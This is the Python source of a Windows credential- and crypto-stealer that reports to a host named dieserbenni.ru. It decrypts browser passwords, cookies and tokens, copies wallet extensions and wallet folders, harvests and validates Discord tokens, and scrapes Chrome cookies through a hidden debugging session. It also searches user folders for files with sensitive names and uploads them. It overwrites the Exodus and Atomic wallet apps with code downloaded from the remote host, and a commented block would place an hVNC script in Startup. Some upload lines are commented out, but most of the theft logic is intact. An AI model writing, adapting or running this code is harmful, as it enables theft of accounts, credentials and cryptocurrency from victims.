import base64
import json
import os
import re
import sqlite3
import shutil
import subprocess
import zipfile
import sys
from urllib.request import Request, urlopen

"""
Don't run this unless you've removed all network functions.
"""





CURRENT_INTERPRETER = sys.executable
proc = subprocess.Popen([CURRENT_INTERPRETER, "-m", "pip", "install", "pycryptodome", "pypiwin32", "pywin32","requests", "websocket-client"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,creationflags=subprocess.CREATE_NO_WINDOW)
proc.wait()



try:
    import win32crypt
    from Crypto.Cipher import AES
    import requests
    import websocket



except:
    current_file = os.path.abspath(__file__)
    subprocess.Popen([CURRENT_INTERPRETER, current_file], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,creationflags=subprocess.CREATE_NO_WINDOW)
    exit()











USER_PROFILE = os.getenv('USERPROFILE')
APPDATA = os.getenv('APPDATA')
LOCALAPPDATA = os.getenv('LOCALAPPDATA')
STORAGE_PATH = APPDATA + "\\gruppe_storage"
STARTUP_PATH = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")



if not os.path.exists(STORAGE_PATH):
    os.makedirs(STORAGE_PATH)


CHROMIUM_BROWSERS = [
    {"name": "Google Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"), "taskname": "chrome.exe"},
    {"name": "Microsoft Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"), "taskname": "msedge.exe"},
    {"name": "Opera", "path": os.path.join(APPDATA, "Opera Software", "Opera Stable"), "taskname": "opera.exe"},
    {"name": "Opera GX", "path": os.path.join(APPDATA, "Opera Software", "Opera GX Stable"), "taskname": "opera.exe"},
    {"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"), "taskname": "brave.exe"},
    {"name": "Yandex", "path": os.path.join(APPDATA, "Yandex", "YandexBrowser", "User Data"), "taskname": "yandex.exe"},
]


CHROMIUM_SUBPATHS = [

    {"name": "None", "path": ""},
    {"name": "Default", "path": "Default"},
    {"name": "Profile 1", "path": "Profile 1"},
    {"name": "Profile 2", "path": "Profile 2"},
    {"name": "Profile 3", "path": "Profile 3"},
    {"name": "Profile 4", "path": "Profile 4"},
    {"name": "Profile 5", "path": "Profile 5"},

]



BROWSER_EXTENSIONS = [



    {"name": "Authenticator", "path": "\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai"},



    {"name": "Binance", "path": "\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"},



    {"name": "Bitapp", "path": "\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi"},



    {"name": "BoltX", "path": "\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca"},



    {"name": "Coin98", "path": "\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg"},



    {"name": "Coinbase", "path": "\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad"},



    {"name": "Core", "path": "\\Local Extension Settings\\agoakfejjabomempkjlepdflaleeobhb"},



    {"name": "Crocobit", "path": "\\Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkecke"},



    {"name": "Equal", "path": "\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac"},



    {"name": "Ever", "path": "\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk"},



    {"name": "ExodusWeb3", "path": "\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno"},



    {"name": "Fewcha", "path": "\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj"},



    {"name": "Finnie", "path": "\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj"},



    {"name": "Guarda", "path": "\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln"},



    {"name": "Guild", "path": "\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj"},



    {"name": "HarmonyOutdated", "path": "\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib"},



    {"name": "Iconex", "path": "\\Local Extension Settings\\flpiciilemghbmfalicajoolhkkenfel"},



    {"name": "Jaxx Liberty", "path": "\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne"},



    {"name": "Kaikas", "path": "\\Local Extension Settings\\jblndlipeogpafnldhgmapagcccfchpi"},



    {"name": "KardiaChain", "path": "\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk"},



    {"name": "Keplr", "path": "\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap"},



    {"name": "Liquality", "path": "\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn"},



    {"name": "MEWCX", "path": "\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm"},



    {"name": "MaiarDEFI", "path": "\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm"},



    {"name": "Martian", "path": "\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk"},



    {"name": "Math", "path": "\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc"},



    {"name": "Metamask", "path": "\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"},



    {"name": "Metamask2", "path": "\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"},



    {"name": "Mobox", "path": "\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo"},



    {"name": "Nami", "path": "\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo"},



    {"name": "Nifty", "path": "\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid"},



    {"name": "Oxygen", "path": "\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh"},



    {"name": "PaliWallet", "path": "\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn"},



    {"name": "Petra", "path": "\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci"},



    {"name": "Phantom", "path": "\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa"},



    {"name": "Pontem", "path": "\\Local Extension Settings\\phkbamefinggmakgklpkljjmgibohnba"},



    {"name": "Ronin", "path": "\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec"},



    {"name": "Safepal", "path": "\\Local Extension Settings\\lgmpcpglpngdoalbgeoldeajfclnhafa"},



    {"name": "Saturn", "path": "\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig"},



    {"name": "Slope", "path": "\\Local Extension Settings\\pocmplpaccanhmnllbbkpgfliimjljgo"},



    {"name": "Solfare", "path": "\\Local Extension Settings\\bhhhlbepdkbapadjdnnojkbgioiodbic"},



    {"name": "Sollet", "path": "\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno"},



    {"name": "Starcoin", "path": "\\Local Extension Settings\\mfhbebgoclkghebffdldpobeajmbecfk"},



    {"name": "Swash", "path": "\\Local Extension Settings\\cmndjbecilbocjfkibfbifhngkdmjgog"},



    {"name": "TempleTezos", "path": "\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc"},



    {"name": "TerraStation", "path": "\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp"},



    {"name": "Tokenpocket", "path": "\\Local Extension Settings\\mfgccjchihfkkindfppnaooecgfneiii"},



    {"name": "Ton", "path": "\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd"},



    {"name": "Tron", "path": "\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec"},



    {"name": "Trust Wallet", "path": "\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph"},



    {"name": "Wombat", "path": "\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih"},



    {"name": "XDEFI", "path": "\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf"},



    {"name": "XMR.PT", "path": "\\Local Extension Settings\\eigblbgjknlfbajkfhopmcojidlgcehm"},



    {"name": "XinPay", "path": "\\Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofo"},



    {"name": "Yoroi", "path": "\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb"},



    {"name": "iWallet", "path": "\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj"}



]







WALLET_PATHS = [



    {"name": "Atomic", "path": os.path.join(APPDATA, "atomic", "Local Storage", "leveldb")},



    {"name": "Exodus", "path": os.path.join(APPDATA, "Exodus", "exodus.wallet")},



    {"name": "Electrum", "path": os.path.join(APPDATA, "Electrum", "wallets")},



    {"name": "Electrum-LTC", "path": os.path.join(APPDATA, "Electrum-LTC", "wallets")},



    {"name": "Zcash", "path": os.path.join(APPDATA, "Zcash")},



    {"name": "Armory", "path": os.path.join(APPDATA, "Armory")},



    {"name": "Bytecoin", "path": os.path.join(APPDATA, "bytecoin")},



    {"name": "Jaxx", "path": os.path.join(APPDATA, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb")},



    {"name": "Etherium", "path": os.path.join(APPDATA, "Ethereum", "keystore")},



    {"name": "Guarda", "path": os.path.join(APPDATA, "Guarda", "Local Storage", "leveldb")},



    {"name": "Coinomi", "path": os.path.join(APPDATA, "Coinomi", "Coinomi", "wallets")},



    {"name": "Telegram", "path": os.path.join(APPDATA, "Telegram Desktop", "tdata")},



]







PATHS_TO_SEARCH = [



    USER_PROFILE + "\\Desktop",



    USER_PROFILE + "\\Documents",



    USER_PROFILE + "\\Downloads",



    USER_PROFILE + "\\OneDrive\\Documents",



    USER_PROFILE + "\\OneDrive\\Desktop",



]







FILE_KEYWORDS = [



        "passw",



        "mdp",



        "motdepasse",



        "mot_de_passe",



        "login",



        "secret",



        "account",



        "acount",



        "paypal",



        "banque",



        "metamask",



        "wallet",



        "crypto",



        "exodus",



        "discord",



        "2fa",



        "code",



        "memo",



        "compte",



        "token",



        "backup",



        "seecret"



]







ALLOWED_EXTENSIONS = [



    ".txt",



    ".log",



    ".doc",



    ".docx",



    ".xls",



    ".xlsx",



    ".ppt",



    ".pptx",



    ".odt",



    ".pdf",



    ".rtf",



    ".json",



    ".csv",



    ".db",



    ".jpg",



    ".jpeg",



    ".png",



    ".gif",



    ".webp",



    ".mp4"



]







DISCORD_PATHS = [



    {"name": "Discord", "path": os.path.join(APPDATA, "discord", "Local Storage", "leveldb")},



    {"name": "Discord Canary", "path": os.path.join(APPDATA, "discordcanary", "Local Storage", "leveldb")},



    {"name": "Discord PTB", "path": os.path.join(APPDATA, "discordptb", "Local Storage", "leveldb")},



    {"name": "Opera", "path": os.path.join(APPDATA, "Opera Software", "Opera Stable", "Local Storage", "leveldb")},



    {"name": "Opera GX", "path": os.path.join(APPDATA, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb")},



    {"name": "Amigo", "path": os.path.join(LOCALAPPDATA, "Amigo", "User Data", "Local Storage", "leveldb")},



    {"name": "Torch", "path": os.path.join(LOCALAPPDATA, "Torch", "User Data", "Local Storage", "leveldb")},



    {"name": "Kometa", "path": os.path.join(LOCALAPPDATA, "Kometa", "User Data", "Local Storage", "leveldb")},



    {"name": "Orbitum", "path": os.path.join(LOCALAPPDATA, "Orbitum", "User Data", "Local Storage", "leveldb")},



    {"name": "CentBrowser", "path": os.path.join(LOCALAPPDATA, "CentBrowser", "User Data", "Local Storage", "leveldb")},



    {"name": "7Star", "path": os.path.join(LOCALAPPDATA, "7Star", "7Star", "User Data", "Local Storage", "leveldb")},



    {"name": "Sputnik", "path": os.path.join(LOCALAPPDATA, "Sputnik", "Sputnik", "User Data", "Local Storage", "leveldb")},



    {"name": "Vivaldi", "path": os.path.join(LOCALAPPDATA, "Vivaldi", "User Data", "Default", "Local Storage", "leveldb")},



    {"name": "Chrome SxS", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome SxS", "User Data", "Local Storage", "leveldb")},



    {"name": "Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb")},



    {"name": "Chrome1", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb")},



    {"name": "Chrome2", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 2", "Local Storage", "leveldb")},



    {"name": "Chrome3", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 3", "Local Storage", "leveldb")},



    {"name": "Chrome4", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 4", "Local Storage", "leveldb")},



    {"name": "Chrome5", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 5", "Local Storage", "leveldb")},



    {"name": "Epic Privacy Browser", "path": os.path.join(LOCALAPPDATA, "Epic Privacy Browser", "User Data", "Local Storage", "leveldb")},



    {"name": "Microsoft Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb")},



    {"name": "Uran", "path": os.path.join(LOCALAPPDATA, "uCozMedia", "Uran", "User Data", "Default", "Local Storage", "leveldb")},



    {"name": "Yandex", "path": os.path.join(LOCALAPPDATA, "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb")},



    {"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb")},



    {"name": "Iridium", "path": os.path.join(LOCALAPPDATA, "Iridium", "User Data", "Default", "Local Storage", "leveldb")}



]



DISCORD_TOKENS = []



PASSWORDS = []



COOKIES = []



WEB_DATA = []



DISCORD_IDS = []











def decrypt_data(data, key):



    try:



        iv = data[3:15]



        data = data[15:]



        cipher = AES.new(key, AES.MODE_GCM, iv)



        return cipher.decrypt(data)[:-16].decode()



    except:



        return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])











def zip_to_storage(name, source, destination):



    if os.path.isfile(source):



        with zipfile.ZipFile(destination + f"\\{name}.zip", "w") as z:



            z.write(source, os.path.basename(source))



    else:



        with zipfile.ZipFile(destination + f"\\{name}.zip", "w") as z:



            for root, dirs, files in os.walk(source):



                for file in files:



                    z.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), os.path.join(source, '..')))











def upload_to_server(filepath):



    for i in range(10):



        try:



            url = "https://dieserbenni.ru/delivery2"



            files = {'file': open(filepath, 'rb')}



            #r = requests.post(url, files=files)



            #if r.status_code == 200:



                #break



        except: pass











def validate_discord_token(token):



    r = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})



    if r.status_code == 200:



        return r.json()



    else:



        return None











def taskkill(taskname):



    subprocess.run(["taskkill", "/F", "/IM", taskname], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)







def inject():



    procc = "exodus.exe"



    local = os.getenv("localappdata")



    path = f"{local}/exodus"



    if not os.path.exists(path): return



    listOfFile = os.listdir(path)



    apps = []



    for file in listOfFile:



        if "app-" in file:



            apps += [file]



    #exodusPatchURL = "https://dieserbenni.ru/app2.asar"



    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"}



    req = Request(exodusPatchURL, headers=headers)



    response = urlopen(req)



    data = response.read()



    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)



    for app in apps:



        try:



            fullpath = f"{path}/{app}/resources/app.asar"



            with open(fullpath, 'wb') as out_file1:



                out_file1.write(data)



        except: pass







for i in range(10):



    try:



        inject()



        break



    except: pass



def inject_atomic():



    procc = "Atomic Wallet.exe"



    local = os.getenv("localappdata")



    path = f"{local}/Programs/atomic"



    if not os.path.exists(path): return



    atomicPatchURL = "https://dieserbenni.ru/atomic/app2.asar"



    headers = {"User-Agent": "Mozilla/5.0"}



    req = Request(atomicPatchURL, headers=headers)



    response = urlopen(req)



    data = response.read()



    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)



    try:



        fullpath = f"{path}/resources/app.asar"



        with open(fullpath, 'wb') as out_file1:



            out_file1.write(data)



    except: pass







for i in range(10):



    try:



        inject_atomic()



        break



    except: pass







for browser in CHROMIUM_BROWSERS:



    taskkill(browser["taskname"])



    local_state = os.path.join(browser["path"], "Local State")



    if not os.path.exists(local_state): continue



    with open(local_state, "r", encoding="utf-8") as f:



        local_state = json.loads(f.read())



    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]



    decryption_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]



    for subpath in CHROMIUM_SUBPATHS:



        if not os.path.exists(os.path.join(browser["path"], subpath["path"])): continue



        try:



            login_data_file = os.path.join(browser["path"], subpath["path"], "Login Data")



            temp_db = os.path.join(browser["path"], subpath["path"], f"{browser['name']}-pw.db")



            shutil.copy(login_data_file, temp_db)



            connection = sqlite3.connect(temp_db)



            cursor = connection.cursor()



            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")



            for row in cursor.fetchall():



                origin_url = row[0]



                username = row[1]



                password = decrypt_data(row[2], decryption_key)



                if username or password:



                    PASSWORDS.append({"browser": browser["name"], "profile": subpath["name"], "url": origin_url, "username": username, "password": password})



            cursor.close()



            connection.close()



            os.remove(temp_db)



        except:



            pass







        try:



            cookies_file = os.path.join(browser["path"], subpath["path"], "Network", "Cookies")



            temp_db = os.path.join(browser["path"], subpath["path"], "Network", f"{browser['name']}-ck.db")



            shutil.copy(cookies_file, temp_db)



            connection = sqlite3.connect(temp_db)



            cursor = connection.cursor()



            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")



            cookie_str = ""



            for row in cursor.fetchall():



                host = row[0]



                name = row[1]



                value = decrypt_data(row[2], decryption_key)



                cookie_str += f"{host}\tTRUE\t/\tFALSE\t13355861278849698\t{name}\t{value}\n"



            COOKIES.append({"browser": browser["name"], "profile": subpath["name"], "cookies": base64.b64encode(cookie_str.encode()).decode()})



            cursor.close()



            connection.close()



            os.remove(temp_db)



        except:



            pass



        try:

            web_data_file = os.path.join(browser["path"], subpath["path"], "Web Data")



            temp_db = os.path.join(browser["path"], subpath["path"], f"{browser['name']}-webdata.db")



            shutil.copy(web_data_file, temp_db)



            connection = sqlite3.connect(temp_db)



            cursor = connection.cursor()



            cursor.execute("SELECT service, encrypted_token FROM token_service")



            for row in cursor.fetchall():



                web_service = row[0]



                web_token = decrypt_data(row[1], decryption_key)



                WEB_DATA.append({"browser": browser["name"], "profile": subpath["name"], "service": web_service, "token": web_token})



            cursor.close()



            connection.close()



            os.remove(temp_db)

        except:

            pass





        for extension in BROWSER_EXTENSIONS:



            extension_path = os.path.join(browser["path"], subpath["path"]) + extension["path"]



            if os.path.exists(extension_path):



                try:



                    zip_to_storage(f"{browser['name']}-{subpath['name']}-{extension['name']}", extension_path, STORAGE_PATH)



                except:



                    pass



firefox_path = os.path.join(APPDATA, 'Mozilla', 'Firefox', 'Profiles')



if os.path.exists(firefox_path):



    taskkill("firefox.exe")



    for profile in os.listdir(firefox_path):



        try:



            if profile.endswith('.default') or profile.endswith('.default-release'):



                profile_path = os.path.join(firefox_path, profile)



                if os.path.exists(os.path.join(profile_path, "cookies.sqlite")):



                    shutil.copy(os.path.join(profile_path, "cookies.sqlite"), os.path.join(profile_path, "cookies-copy.sqlite"))



                    connection = sqlite3.connect(os.path.join(profile_path, "cookies-copy.sqlite"))



                    cursor = connection.cursor()



                    cursor.execute("SELECT host, name, value FROM moz_cookies")



                    cookie_str = ""



                    for row in cursor.fetchall():



                        host, name, value = row



                        cookie_str += f"{host}\tTRUE\t/\tFALSE\t13355861278849698\t{name}\t{value}\n"



                    COOKIES.append({"browser": "Firefox", "profile": profile, "cookies": base64.b64encode(cookie_str.encode()).decode()})



                    cursor.close()



                    connection.close()



                    os.remove(os.path.join(profile_path, "cookies-copy.sqlite"))



        except:



            continue







for wallet_file in WALLET_PATHS:



    if os.path.exists(wallet_file["path"]):



        try:



            zip_to_storage(wallet_file["name"], wallet_file["path"], STORAGE_PATH)



        except:



            pass





chrome_path = None

if os.path.exists("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"):

    chrome_path = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"

elif os.path.exists("C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"):

    chrome_path = "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"



if chrome_path is not None:

    for profile in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"]:

        if os.path.exists(LOCALAPPDATA + f"\\Google\\Chrome\\User Data\\{profile}"):

            taskkill("chrome.exe")

            strtcmd = f'"{chrome_path}" --window-position=-2400,-2400 --remote-debugging-port=9222 --remote-allow-origins=* --profile-directory="{profile}"'

            subprocess.Popen(strtcmd, creationflags=subprocess.CREATE_NEW_CONSOLE, close_fds=True)

            targets = requests.get("http://localhost:9222/json").json()

            ws_url = targets[0]["webSocketDebuggerUrl"]

            ws = websocket.create_connection(ws_url)

            payload = {

                "id": 1,

                "method": "Storage.getCookies",

                "params": {}

            }

            ws.send(json.dumps(payload))

            cookie_str = ""

            for cookie in json.loads(ws.recv())["result"]["cookies"]:

                cookie_str += f"{cookie['domain']}\tTRUE\t/\tFALSE\t13355861278849698\t{cookie['name']}\t{cookie['value']}\n"

            with open(STORAGE_PATH + f"\\Cookies-Chrome-New-{profile}.txt", "w") as f:

                f.write(cookie_str)

            ws.close()

            taskkill("chrome.exe")













for discord_path in DISCORD_PATHS:



    if not os.path.exists(discord_path["path"]): continue



    try:



        name_without_spaces = discord_path["name"].replace(" ", "")



        if "cord" in discord_path["path"]:



            if not os.path.exists(APPDATA + f"\\{name_without_spaces}\\Local State"): continue



            try:



                with open(APPDATA + f"\\{name_without_spaces}\\Local State", "r", encoding="utf-8") as f:



                    local_state = json.loads(f.read())



                key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]



                decryption_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]



                for file_name in os.listdir(discord_path["path"]):



                    if file_name[-3:] not in ["ldb", "log"]: continue



                    for line in [x.strip() for x in open(f'{discord_path["path"]}\\{file_name}', errors='ignore').readlines() if x.strip()]:



                        for y in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):



                            token = decrypt_data(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), decryption_key)



                            token_data = validate_discord_token(token)



                            if token_data:



                                if token_data["id"] not in DISCORD_IDS:



                                    DISCORD_IDS.append(token_data["id"])



                                    username = token_data["username"] if token_data["discriminator"] == "0" else f"{token_data['username']}#{token_data['discriminator']}"



                                    phone_number = token_data["phone"] if token_data["phone"] else "Not linked"



                                    DISCORD_TOKENS.append(



                                        {"token": token, "user_id": token_data["id"], "username": username,



                                         "display_name": token_data["global_name"], "email": token_data["email"],



                                         "phone": phone_number})



            except:



                pass



        else:



            for file_name in os.listdir(discord_path["path"]):



                if file_name[-3:] not in ["ldb", "log"]: continue



                for line in [x.strip() for x in open(f'{discord_path["path"]}\\{file_name}', errors='ignore').readlines() if x.strip()]:



                    for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line):



                        token_data = validate_discord_token(token)



                        if token_data:



                            if token_data["id"] not in DISCORD_IDS:



                                DISCORD_IDS.append(token_data["id"])



                                username = token_data["username"] if token_data["discriminator"] == "0" else f"{token_data['username']}#{token_data['discriminator']}"



                                phone_number = token_data["phone"] if token_data["phone"] else "Not linked"



                                DISCORD_TOKENS.append(



                                    {"token": token, "user_id": token_data["id"], "username": username,



                                     "display_name": token_data["global_name"], "email": token_data["email"],



                                     "phone": phone_number})



    except:



        pass











with open(STORAGE_PATH + "\\Passwords.txt", "w") as f:



    f.write(



        f"\n{'-'*50}\n".join([



            f"LOCATION: {pw['browser']} - {pw['profile']}\n"



            f"URL: {pw['url']}\n"



            f"USERNAME: {pw['username']}\n"



            f"PASSWORD: {pw['password']}"



            for pw in PASSWORDS



        ])



    )



upload_to_server(STORAGE_PATH + "\\Passwords.txt")



for cookie in COOKIES:



    with open(STORAGE_PATH + f"\\Cookies-{cookie['browser']}-{cookie['profile']}.txt", "w") as f:



        f.write(base64.b64decode(cookie["cookies"]).decode())



with open(STORAGE_PATH + "\\GRUPPE_WEB_DATA.txt", "w") as f:



    f.write(

        f"\n{'-' * 50}\n".join([



            f"LOCATION: {w_data['browser']} - {w_data['profile']}\n"



            f"SERVICE: {w_data['service']}\n"



            f"TOKEN: {w_data['token']}\n"

            

            f"{w_data['service'].replace('AccountId-', '')}:{w_data['token']}"



            for w_data in WEB_DATA

        ])



    )





for discord_token in DISCORD_TOKENS:



    with open(STORAGE_PATH + "\\discord-tokens.txt", "w") as f:



        f.write(



            f"\n{'-' * 50}\n".join([



                f"ID: {discord_token['user_id']}\n"



                f"USERNAME: {discord_token['username']}\n"



                f"DISPLAY NAME: {discord_token['display_name']}\n"



                f"EMAIL: {discord_token['email']}\n"



                f"PHONE: {discord_token['phone']}\n"



                f"TOKEN: {discord_token['token']}"



                for discord_token in DISCORD_TOKENS



            ])



        )







for file_to_upload in os.listdir(STORAGE_PATH):



    try:



        upload_to_server(STORAGE_PATH + "\\" + file_to_upload)



    except:



        pass



for path in PATHS_TO_SEARCH:



    for root, _, files in os.walk(path):



        for file_name in files:



            for keyword in FILE_KEYWORDS:



                if keyword in file_name.lower():



                    for extension in ALLOWED_EXTENSIONS:



                        if file_name.endswith(extension):



                            try:



                                upload_to_server(os.path.join(root, file_name))



                            except:



                                pass



#try:

#

#    URL = "https://dieserbenni.ru/hvnc.py"

#

#    r = requests.get(URL)

#

#    with open(os.path.join(STARTUP_PATH, "hvnc.py"), "wb") as f:

#

#        f.write(r.content)

#

#except: pass



try:



    os.remove(STORAGE_PATH)



except: pass





